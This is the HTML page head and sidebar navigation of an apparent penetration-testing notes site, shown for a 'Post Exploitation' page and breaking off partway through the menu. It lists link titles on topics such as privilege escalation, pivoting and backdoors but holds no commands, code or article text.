<!DOCTYPE html>





    

    

    

    

<html lang="en"><head>
    <meta charset="utf-8" />
    <title>Post Exploitation | D0CUM3NTN4T10N</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="keywords" content="Documentation, Hugo, Hugo Theme, Bootstrap" />
    <meta name="author" content="Colin Wilson - Lotus Labs" />
    <meta name="email" content="support@aigis.uk" />
    <meta name="website" content="https://lotusdocs.dev" />
    <meta name="Version" content="v0.1.0" />
    
    <link rel="icon" href="https://documentnation.github.io/favicon.ico" sizes="any">
<link rel="apple-touch-icon" sizes="180x180" href="https://documentnation.github.io/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://documentnation.github.io/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://documentnation.github.io/favicon-16x16.png">
<link rel="manifest" crossorigin="use-credentials" href="https://documentnation.github.io/site.webmanifest">
<meta property="og:title" content="Post Exploitation" />
<meta property="og:description" content="" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://documentnation.github.io/docs/hdks/linux/post-exploitation/" /><meta property="og:image" content="https://documentnation.github.io/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_10758462138397547075.png"/><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://documentnation.github.io/opengraph/card-base-2_hu06b1a92291a380a0d2e0ec03dab66b2f_17642_filter_10758462138397547075.png"/>
<meta name="twitter:title" content="Post Exploitation"/>
<meta name="twitter:description" content=""/>

    
    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
    
    
            
                
                <script type="text/javascript" src="https://documentnation.github.io/docs/js/flexsearch.bundle.min.70b92c4c5202c26b45d7aa43e130e8440032cac751b9b9206ddba2052699286ac95beb01bb7f975514cc694a019a03c8.js" integrity="sha384-cLksTFICwmtF16pD4TDoRAAyysdRubkgbduiBSaZKGrJW&#43;sBu3&#43;XVRTMaUoBmgPI" crossorigin="anonymous"></script>
                
        
    
    
    
    
        
        
        
        
    
        
        
        
        
    
    
    <link rel="preconnect" href="https://fonts.gstatic.com/" />
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
    <link href="https://fonts.googleapis.com/css?family=JetBrains+Mono:100,200,300,400,500,600,700,800|Fira+Code:500,700&display=block" rel="stylesheet">

    <link rel="stylesheet" href="/docs/scss/style.min.b49e59cf5cffb600c180964d03ba8ff5aaba2f6d26701bc2dd7a2082ac9cf849599b4f38cbbc52d928f85c9fb2f4455a.css" integrity="sha384-tJ5Zz1z/tgDBgJZNA7qP9aq6L20mcBvC3Xoggqyc&#43;ElZm084y7xS2Sj4XJ&#43;y9EVa"crossorigin="anonymous">
    
    
    
    </head><body>
        <div class="content">
            <div class="page-wrapper toggled">
<nav id="sidebar" class="sidebar-wrapper">
    <div class="sidebar-brand">
        <a href='/' aria-label="HomePage" alt="HomePage">
            
                <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
            
        </a>
    </div>
    <div class="sidebar-content" style="height: calc(100% - 131px);">
        <ul class="sidebar-menu">
            
                
                
                    
                        
                        <li class="">
                            <a class="sidebar-root-link" href="https://documentnation.github.io/docs/htb/">
                                <i class="material-icons me-2">deployed_code</i>
                                
                                HTB
                            </a>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">workspace_premium</i>
                                TCM-PEH
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class="sidebar-dropdown nested  ">
                                                <button class="btn">
                                                    
                                                    Reconnaissance
                                                </button>
                                                <div class="sidebar-submenu ">
                                                    <ul>
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/tcm-peh/reconnaissance/identifying/">Identifying My Target</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/tcm-peh/reconnaissance/email_discovery/">Email Hunting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/tcm-peh/reconnaissance/credentials_hunting/">Credential Hunting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/tcm-peh/reconnaissance/subdomain_hunting/">Subdomain Hunting</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/tcm-peh/reconnaissance/web_technologies/">Web Technologies</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/tcm-peh/reconnaissance/google_fu/">Google Fu</a></li>
                                                            
                                                        
                                                    </ul>
                                                </div>
                                            </li>
                                        
                                    
                                        
                                        
                                            <li class="sidebar-dropdown nested  ">
                                                <button class="btn">
                                                    
                                                    Scanning &amp; Enumeration
                                                </button>
                                                <div class="sidebar-submenu ">
                                                    <ul>
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/tcm-peh/enumeration/kioptrix/">Kioptrix</a></li>
                                                            
                                                        
                                                    </ul>
                                                </div>
                                            </li>
                                        
                                    
                                        
                                        
                                            <li class="sidebar-dropdown nested  ">
                                                <button class="btn">
                                                    
                                                    Exploitation
                                                </button>
                                                <div class="sidebar-submenu ">
                                                    <ul>
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/tcm-peh/exploitation/kioptrix/">Kioptrix</a></li>
                                                            
                                                        
                                                    </ul>
                                                </div>
                                            </li>
                                        
                                    
                                        
                                        
                                            <li class="sidebar-dropdown nested  ">
                                                <button class="btn">
                                                    
                                                    Persistence
                                                </button>
                                                <div class="sidebar-submenu ">
                                                    <ul>
                                                        
                                                    </ul>
                                                </div>
                                            </li>
                                        
                                    
                                        
                                        
                                            <li class="sidebar-dropdown nested  ">
                                                <button class="btn">
                                                    
                                                    Covering Tracks
                                                </button>
                                                <div class="sidebar-submenu ">
                                                    <ul>
                                                        
                                                    </ul>
                                                </div>
                                            </li>
                                        
                                    
                                        
                                        
                                            <li class="sidebar-dropdown nested  ">
                                                <button class="btn">
                                                    
                                                    Exploit Development
                                                </button>
                                                <div class="sidebar-submenu ">
                                                    <ul>
                                                        
                                                    </ul>
                                                </div>
                                            </li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  current active">
                            <button class="btn">
                                <i class="material-icons me-2">tag</i>
                                Notes [HDKS]
                            </button>
                            <div class="sidebar-submenu d-block">
                                <ul>
                                    
                                        
                                        
                                            <li class="sidebar-dropdown nested  ">
                                                <button class="btn">
                                                    
                                                    Reconnaissance
                                                </button>
                                                <div class="sidebar-submenu ">
                                                    <ul>
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/osint/">OSINT (Open Source Intelligence)</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/google-dorks/">Google Dorks</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/person-investigation/">Person Investigation</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/port-scan/">Port Scan</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/email-analysis/">Email Analysis</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/subdomain-discovery/">Subdomain Discovery</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/github-dorks/">GitHub Dorks</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/find-leaked-api-keys/">Find Leaked API Keys</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/shodan-dorks/">Shodan Dorks</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/imint-and-geoint/">IMINT (Image Intelligence) and GEOINT (Geospatial Intelligence)</a></li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/reconnaissance/social-engineering/">Social Engineering</a></li>
                                                            
                                                        
                                                    </ul>
                                                </div>
                                            </li>
                                        
                                    
                                        
                                        
                                            <li class="sidebar-dropdown nested  current active">
                                                <button class="btn">
                                                    
                                                    Linux
                                                </button>
                                                <div class="sidebar-submenu d-block">
                                                    <ul>
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Protocol
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/protocol/x11-pentesting/">X11 (X Window System) Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Privilege Escalation
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/">Sudo Privilege Escalation by Overriding Shared Library</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/">Shared Library Hijacking</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/">PolKit Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-git-privilege-escalation/">Sudo Git Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/">Sudo Systemctl Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/">Buffer Overflow Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/">Rust Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/">Gnuplot Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/">Pip Download Code Execution</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/">SSSD Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/">Python Eval Code Execution</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/">Tar Wildcard Injection PrivEsc</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/">Ghidra Debug Mode RCE</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/">Python Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/">Sudoedit Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/">irb (Interactive Ruby Shell) Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/">Ruby Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/">Python Jails Escape</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/">Python Yaml Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/">Bash eq Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/">Ansible Playbook Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/">Chrome Remote Debugger Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/">OpenSSL Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/">Apache Conf Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-tee-privilege-escalation/">Sudo Tee Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/">Sudo OpenVPN Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/">Update-Motd Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/">Sudo Umount Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/">Sudo Java Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/">Sudo Service Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/">Snapd Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/">Sudo ClamAV Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/">Sudo Dstat Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-exiftool-privilege-escalation/">Sudo Exiftool Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-fail2ban-privilege-escalation/">Sudo Fail2ban Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/">Sudo Path Traversal Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/">Sudo Reboot Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/">Sudo Screen Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/">Sudo Shutdown, Poweroff Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-vim-privilege-escalation/">Sudo Vim Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/">Sudo Wall Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/">Sudo Wget Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/">Mozilla Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  current active">
                                                                    <button class="btn">
                                                                        
                                                                        Post Exploitation
                                                                    </button>
                                                                    <div class="sidebar-submenu d-block">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/post-exploitation/cover-your-tracks-in-linux/">Cover Your Tracks in Linux</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-pivoting/">Linux Pivoting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-backdoors/">Linux Backdoors</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Management
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/management/file-transfer-in-linux/">File Transfer in Linux</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/management/shell-scripting/">Shell Scripting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/management/add-and-delete-groups-in-linux/">Add &amp; Delete Groups in Linux</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/management/add-and-delete-user-in-linux/">Add &amp; Delete Users in Linux</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/management/file-and-directory-ownership-in-linux/">File &amp; Directory Ownership in Linux</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/management/file-and-directory-permission-in-linux/">File &amp; Directory Permission in Linux</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Container
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/container/lxc-lxd-privilege-escalation/">LXC/LXD (Linux Container/Daemon) Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Backup
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/backup/borgbackup-pentesting/">BorgBackup Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Archive
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/archive/crack-7z-password/">Crack 7z Password</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/archive/zip-unzip/">Zip &amp; Unzip</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/archive/crack-zip-password/">Crack Zip Password</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/archive/7z/">7z</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/archive/bzip-bunzip/">Bzip2 &amp; Bunzip2</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/archive/gzip-gunzip/">Gzip &amp; Gunzip</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/archive/tar/">Tar</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/linux/attack/fork-bomb/">Fork Bomb</a></li>
                                                            
                                                        
                                                    </ul>
                                                </div>
                                            </li>
                                        
                                    
                                        
                                        
                                            <li class="sidebar-dropdown nested  ">
                                                <button class="btn">
                                                    
                                                    Windows
                                                </button>
                                                <div class="sidebar-submenu ">
                                                    <ul>
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Wsl
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/wsl/wsl-pentesting/">WSL Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Technique
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/technique/download-files-in-windows/">Download Files in Windows</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Service
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/service/m365-pentesting/">M365 (Microsoft Office 365) Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/service/windows-print-spooler-service/">Windows Print Spooler Service</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/service/microsoft-outlook-message/">Microsoft Outlook Message (.msg)</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/service/microsoft-word-pentesting/">Microsoft Word Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Protocol
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/protocol/msrpc-pentesting/">MSRPC (Microsoft Remote Procedure Call) Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
